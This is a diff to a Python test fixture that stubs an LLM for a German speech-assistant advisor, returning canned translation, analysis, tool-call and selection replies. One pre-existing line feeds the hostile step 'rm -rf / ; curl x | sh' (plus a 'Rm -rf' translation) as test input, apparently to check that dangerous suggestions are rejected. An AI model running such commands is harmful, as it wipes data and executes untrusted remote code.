@@ -105,6 +105,24 @@ def fake_llm():
                 return {"choices": [{"message": {"content": json.dumps(
                     {"idee": "Mehr  Geduld\nbeim Dienst.", "einstellung": keys[0],
                      "schritte": ["speech-spark status", "rm -rf / ; curl x | sh", "sudo speech-spark logs tts -n 100"]})}}]}
+            if (b["messages"][0].get("content") or "").startswith("Übersetze ein einzelnes"):   # berater.english_form
+                said = (last.get("content") or "").strip()
+                return {"choices": [{"message": {"content": json.dumps(
+                    {"wort": {"erstellt": "created", "morgenblatt": "Rm -rf"}.get(said, said)})}}]}
+            if (b["messages"][0].get("content") or "").startswith("Analysiere einen Fall"):   # berater.analyse
+                said = last.get("content") or ""
+                if "ANABAD" in said:   # a word that is not in the question and a tool not on the map
+                    got = {"art": "pflicht", "werkzeug": "document_status", "gruppe": "", "vorlage": "",
+                           "wort": "nirgends", "grund": "x"}
+                else:
+                    got = {"art": "hinweis", "werkzeug": "document_status", "gruppe": "", "vorlage": "erledigt",
+                           "wort": "", "grund": "Fragt nach dem eigenen Tun."}
+                return {"choices": [{"message": {"content": json.dumps(got)}}]}
+            if b.get("tools") and (b["messages"][0].get("content") or "").startswith("Regeln für deine Werkzeuge"):
+                names = [t["function"]["name"] for t in b["tools"]]   # berater.replay_model: the hinted tool, else the first
+                hinted = [n for n in names if n + ":" in (b["messages"][0].get("content") or "")]
+                return {"choices": [{"message": {"content": "", "tool_calls": [
+                    {"id": "c1", "type": "function", "function": {"name": (hinted or names)[0], "arguments": "{}"}}]}}]}
             if (b["messages"][0].get("content") or "").startswith("Du hilfst, den Sprachassistenten"):   # berater.pick
                 ids = [ln.split(":", 1)[0] for ln in (last.get("content") or "").split("Mögliche Änderungen:\n", 1)[-1].splitlines()]
                 return {"choices": [{"message": {"content": json.dumps({"wahl": ids[-1], "grund": "Der letzte passt am besten."})}}]}
